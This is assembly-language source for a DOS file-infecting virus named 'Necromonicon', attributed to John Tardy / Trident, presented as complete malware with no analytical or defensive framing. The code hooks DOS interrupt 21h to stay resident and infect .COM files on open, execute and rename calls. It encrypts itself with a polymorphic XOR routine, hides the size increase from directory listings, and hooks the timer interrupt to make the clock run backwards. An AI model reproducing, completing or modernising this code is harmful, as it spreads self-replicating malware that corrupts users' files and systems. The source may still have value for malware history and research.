;
; Necromonicon Virus by John Tardy
;

                Org 0h

decr:           jmp Crypt
                db 'Carcass'
Loopje          DB 0e2h
                db 0fah
DecrLen         Equ $-Decr

Crypt:          Push Ax
                call Get_Ofs
Get_Ofs:        pop Bp
                sub Bp,Get_Ofs
                Mov Ax,0DEADh
                Int 21h
                Cmp Ax,0AAAAh
                Je  Installed

                mov ax,3521h
                int 21h
                mov word ptr cs:old21[bp],bx
                mov word ptr cs:old21[bp][2],es

                mov ax,cs
                dec ax
                mov ds,ax
                cmp byte ptr ds:[0000],'Z'
                jne installed
                mov ax,word ptr ds:[0003]
                sub ax,ParLen
                jb  installed
                mov word ptr ds:[0003],ax
                sub word ptr ds:[0012h],ParLen
                lea si,decr[bp]
                mov di,0
                mov es,ds:[12h]
                mov ds,cs
                mov cx,virlen
                cld
                rep movsb
                mov ax,2521h
                mov ds,es
                mov dx,offset new21
                int 21h
                push es
                Mov     Ax,351ch
                Int     21h
                Mov     Word Ptr OldInt1c[0],Bx
                Mov     Word Ptr OldInt1c[2],Es
                Mov     Ax,251ch
                Lea     Dx,NewInt1c
                Pop     Ds
                Int     21h

Installed:      Mov Di,100h
                Lea Si,Org_Prg[Bp]
                Push Cs
                Push Cs
                Pop Ds
                Pop Es
                Cld
                Movsw
                Movsb
                Mov Bx,100h
                Pop Ax
                Push Bx
                Ret

OldInt1c        DD      0

NewInt1c:       Pushf
                Push    Ds
                Push    Ax
                Xor     Ax,Ax
                Push    Ax
                Pop     Ds
                Mov     Ax,Word Ptr Ds:[46ch]
                Dec     Word Ptr Ds:[46ch]
                Dec     Word Ptr Ds:[46ch]
                Cmp     Ax,Word Ptr Ds:[46ch]
                Ja      EOI1C
                Dec     Word Ptr Ds:[46eh]
EOI1C:          Pop     Ax
                Pop     Ds
                Popf
                Iret

Old21           dd 0

New21:          cmp ax,0deadh
                jne chkfunc
                mov ax,0aaaah
                mov cx,ax
                iret
chkfunc:        cmp ah,11h
                je  findFCBst
                cmp ah,12h
                je findfcbst
                cmp ah,4eh
                je findst
                cmp ah,4fh
                je findst
                push ax
                push bx
                push cx
                push dx
                push si
                push di
                push bp
                push ds
                push es
                cmp ah,3dh
                je  infectHan
                cmp ax,4b00h
                je  infectHan
                cmp ah,41h
                je  infectHan
                cmp ah,43h
                je  infectHan
                cmp ah,56h
                je  infectHan
                cmp ah,0fh
                je  infectFCB
                cmp ah,23h
                je  infectFCB
                cmp ah,6ch
                je  infectdos4
                jmp endint

findfcbst:      jmp findfcb
findst:         jmp find

InfectFCB:      mov si,dx
                inc si
                push cs
                pop es
                lea di,fnam
                mov cx,8
                rep movsb
                mov cx,3
                inc di
                rep movsb
                lea dx,fnam
                push cs
                pop ds

InfectHan:      mov si,dx
                mov cx,100h
                cld
findpnt:        lodsb
                cmp al,'.'
                je  chkcom
                loop findpnt
                jmp  endi

infectdos4:     and dx,0fh
                cmp dx,1
                jne endi
                mov dx,si
                jmp infecthan

chkcom:         lodsw
                or ax,2020h
                cmp ax,'oc'
                jne endi
                lodsb
                or al,20h
                cmp al,'m'
                jne endi
                jmp doitj
endi:           jmp endint
doitj:          push dx
                push ds
                mov ax,4300h
                call dos
                mov cs:fatr,cx
                mov ax,4301h
                xor cx,cx
                call dos
                mov ax,3d02h
                call dos
                jnc getdate
                jmp error
getdate:        xchg ax,bx
                mov ax,5700h
                call dos
                mov cs:fdat,cx
                mov cs:fdat[2],dx
                and cx,1fh
                cmp cx,1fh
                jne chkexe
                jmp done
chkexe:         mov ah,3fh
                push cs
                pop ds
                lea dx,Org_prg
                mov cx,3
                call dos
                cmp word ptr cs:Org_prg[0],'ZM'
                je  close
                cmp word ptr cs:Org_prg[0],'MZ'
                je close

                Mov ax,4202h
                xor cx,cx
                xor dx,dx
                call dos

                sub ax,3
                mov cs:jump[1],ax

                Add Ax,Offset Crypt+103h
                Mov S_1[1],Ax
                Mov S_2[1],Ax
                Mov S_3[4],Ax
                Mov S_4[4],Ax
                Call GenPoly

                mov ah,40h
                push cs
                pop ds
                lea dx,coder
                mov cx,virlen
                call dos

                mov ax,4200h
                xor cx,cx
                xor dx,dx
                call dos

                mov ah,40h
                lea dx,jump
                mov cx,3
                call dos

                or  cs:fdat,01fh

close:          mov ax,5701h
                mov cx,cs:fdat
                mov dx,cs:fdat[2]
                call dos

done:           mov ah,3eh
                call dos
                pop ds
                pop dx
                push dx
                push ds
                mov ax,4301h
                mov cx,fatr
                call dos

error:          pop ds
                pop dx

endint:         pop es
                pop ds
                pop bp
                pop di
                pop si
                pop dx
                pop cx
                pop bx
                pop ax
                jmp dword ptr cs:[old21]

GenPoly:        Xor Byte Ptr [Loopje],2
                Xor Ax,Ax
                Mov Es,Ax
                Mov Ax,Es:[46ch]
                Mov Es,Cs
                Push Ax
                And Ax,07ffh
                Add Ax,CryptLen
                Mov S_1[4],Ax
                Mov S_2[4],Ax
                Mov S_3[1],Ax
                Mov S_4[1],Ax
Doit:           Pop Ax
                Push Ax
                And Ax,3
                Shl Ax,1
                Mov Si,Ax
                Mov Ax,Word Ptr Table[Si]
                Mov Si,Ax
                Lea Di,decr
                Movsw
                Movsw
                Movsw
                Movsw
                Pop Ax
                Stosb
                Movsb
                Mov Dl,Al
                Lea Si,Decr
                Lea Di,Coder
                Mov Cx,DecrLen
                Rep Movsb
                Lea Si,Crypt
                Mov Cx,CryptLen
Encrypt:        Lodsb
                Xor Al,Dl
                Stosb
                Loop Encrypt
                Cmp Dl,0
                Je  Fuckit
                Ret

FuckIt:         Lea Si,Encr0
                Lea Di,Coder
                Mov Cx,Encr0Len
                Rep Movsb
                Mov Ax,Cs:jump[1]
                Add Ax,Encr0Len+2
                Mov Cs:jump[1],Ax
                Ret

Table           DW Offset S_1
                DW Offset S_2
                DW Offset S_3
                DW Offset S_4

S_1:            Lea Si,0
                Mov Cx,0
                DB 80h,34h
                Inc Si
S_2:            Lea Di,0
                Mov Cx,0
                DB 80h,35h
                Inc Di
S_3:            Mov Cx,0
                Lea Si,0
                DB 80h,34h
                Inc Si
S_4:            Mov Cx,0
                Lea Di,0
                DB 80h,35h
                Inc Di

                Db '[ '
Encr0           Db 'John Tardy'
Encr0Len        Equ $-Encr0

                Db ' / Trident'
                Db ' ]'

getdta:         pop si
                pushf
                push ax
                push bx
                push es
                mov  ah,2fh
                call dos
                jmp short si

FindFCB:        call DOS
                cmp al,0
                jne Ret1
                call getdta
                cmp byte ptr es:[bx],-1
                jne FCBOk
                add bx,8
FCBOk:          mov al,es:[bx+16h]
                and al,1fh
                cmp al,1fh
                jne FileOk
                sub word ptr es:[bx+1ch],Virlen
                sbb word ptr es:[bx+1eh],0
                jmp short Time

Find:           call DOS
                jc Ret1
                call getdta
                mov al,es:[bx+16h]
                and al,1fh
                cmp al,1fh
                jne FileOk
                sub word ptr es:[bx+1ah],VirLen
                sbb word ptr es:[bx+1ch],0
Time:           xor byte ptr es:[bx+16h],10h
FileOk:         pop es
                pop bx
                pop ax
                popf
Ret1:           retf 2

                Db '| Trapped in a spell of the Necromonicon |'

dos:            pushf
                call dword ptr cs:[old21]
                ret

Org_prg         dw 0cd90h
                db 20h

fnam            db 8 dup (0)
                db '.'
                db 3 dup (0)
                db 0
fatr            dw 0
fdat            dw 0,0


jump            db 0e9h,0,0

ResLen          Equ ($-Decr)/10h

ParLen          Equ (Reslen*2)+10h

CryptLen        Equ $-Crypt

VirLen          Equ $-Decr

Coder           Equ $
